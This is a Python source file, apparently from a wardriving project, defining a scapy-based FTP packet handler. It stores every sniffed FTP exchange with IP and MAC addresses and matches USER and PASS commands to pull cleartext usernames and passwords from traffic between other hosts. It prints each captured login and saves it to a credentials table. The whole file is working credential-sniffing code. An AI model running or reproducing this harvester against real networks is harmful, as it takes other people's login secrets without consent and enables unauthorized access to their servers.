from scapy.all import *
from wardrive.models import FTPRequest, FTPCredential



class FTPHandler(object):

    def __init__(self):
        self.current_credentials = {}

    def handle(self, pkt):
        data = pkt[Raw].load.decode()
        source_address = str(pkt[IP].src)
        destination_address = str(pkt[IP].dst)

        try:
            code = int(data[:3])
            direction = 'RESPONSE'
        except:
            code = 0
            direction = 'REQUEST'

        payload = data
        now = datetime.now()

        p = FTPRequest()
        p.detection_time = now
        p.code = code
        p.direction = direction
        p.source_address = source_address
        p.destination_address = destination_address
        p.source_mac_address = pkt[Ether].src
        p.destination_mac_address = pkt[Ether].dst
        p.payload = payload
        p.save()

        if 'USER 'in data:
            key = '{}__{}'.format(str(pkt[IP].src), str(pkt[IP].dst))
            self.current_credentials[key] = {'username': data.split('USER')[1].strip(),
                                             'password': None}
        elif 'PASS ' in data:
            key = '{}__{}'.format(str(pkt[IP].src), str(pkt[IP].dst))
            if self.current_credentials.get(key):
                pwd = data.split('PASS ')[1].strip()
                print('FTP LOGIN ({} -> {}) {} :{}'.format(source_address,
                                                           destination_address, self.current_credentials[key]['username'], pwd))
                self.current_credentials[key]['password'] = pwd

                fc = FTPCredential()
                fc.server_address = destination_address
                fc.detection_time = now
                fc.username = self.current_credentials[key]['username']
                fc.password = self.current_credentials[key]['password']
                fc.save()
            else:
                print('FTP PWD WITHOUT LOGIN')


